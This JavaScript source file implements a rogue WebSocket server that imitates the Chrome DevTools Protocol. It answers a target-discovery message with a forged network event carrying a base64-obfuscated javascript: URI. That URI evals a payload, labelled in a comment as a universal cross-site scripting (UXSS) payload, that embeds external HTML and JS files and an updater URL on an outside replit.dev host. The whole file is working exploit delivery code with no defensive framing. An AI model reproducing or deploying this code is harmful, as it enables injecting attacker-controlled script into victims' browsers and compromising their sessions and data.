import { WebSocketServer } from "ws";
import { createServer } from "http";
import finalhandler from "finalhandler";
import serveStatic from "serve-static";
import * as fs from "fs";
import path from "path";
const WebSocket_port = 8080;
const HTTP_port = 9123;
const wss = new WebSocketServer({ port: WebSocket_port });
const serve = serveStatic("./");
createServer((req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    serve(req, res, finalhandler(req, res));
}).listen(HTTP_port);
console.log(
    `The server is accessible at http://localhost:${HTTP_port}\n--------`,
);
console.log(
    `The websocket is accessible at http://localhost:${WebSocket_port}\n--------`,
);
let globalUID = 0;
let sessionId = "89AC63D12B18F3EE9808C13899C9B695";

let htmlFile = fs.readFileSync(new URL('./payloads/index.html', import.meta.url)).toString();
htmlFile.replace('`', '&#96;');
let jsFile = fs.readFileSync(new URL('./payloads/index.js', import.meta.url)).toString();
jsFile = jsFile.replace('`', '\\`').replace('\'', '\\\'').replace('"', '\\"');
// console.log(htmlFile);
wss.on("connection", function connection(wss_con) {
    wss_con.on("message", async (msg) => {
        
        const result = await import('./payload.mjs');
        let json_msg = JSON.parse(msg.toString());
        let { id, method, params } = json_msg;
        console.log(id + "> ", method, params);
        
        if (method === "Target.setDiscoverTargets") {
            wss_con.send(
                JSON.stringify({
                    method: "Network.requestWillBeSent",
                    params: {
                        request: {
                            url: `javascript: (function () {eval(atob("${btoa(`(${result.payload1.toString().replace("%%EXTJS%%", jsFile).replace("%%EXTHTML%%", htmlFile).replace(/%%updaterurl%%/g, "f3cfd40e-c93f-4c15-b48d-d5934bf252b9-00-1m4ke1pxxzx5z.kirk.replit.dev")})()`)}"))})() /********************************************Built-in payload for uxss*/ `,
                        },
                    },
                }),
            );
            
            // setTimeout(function() {
            //     wss_con.send(
            //         JSON.stringify({
            //             method: "Network.requestWillBeSent",
            //             params: {
            //                 request: {
            //                     url: `javascript: (function () {eval(atob("${btoa(`(${payload2.toString()})()`)}"))})()`,
            //                 },
            //             },
            //         }),
            //     );
            // }, 200);
        }

        wss_con.send(
            JSON.stringify({
                id: id,
                error: null,
                sessionId: sessionId,
                result: {},
            }),
        );
    });
});
